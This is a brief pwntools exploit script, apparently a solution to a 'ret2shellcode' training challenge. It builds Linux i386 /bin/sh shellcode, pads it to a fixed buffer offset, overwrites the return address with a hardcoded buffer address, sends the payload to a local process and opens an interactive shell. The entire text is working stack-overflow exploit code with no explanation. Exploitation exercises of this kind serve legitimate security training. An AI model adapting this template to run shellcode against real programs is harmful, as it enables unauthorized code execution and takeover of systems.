from pwn import *
context(arch='i386', os='linux')
sh = process('./ret2shellcode')
shellcode = asm(shellcraft.sh())
buf2_addr = 0x804a080
offset = 0x6c + 4
shellcode_pad = shellcode + (offset - len(shellcode)) * b'A'
print("shellcode len:", len(shellcode), "shellcode:", shellcode)
# sh.sendline(shellcode.ljust(112, b'A') + p32(buf2_addr))
payload = shellcode_pad + p32(buf2_addr)
print("payload len:", len(payload)," payload:", payload)
sh.sendline(payload)
sh.interactive()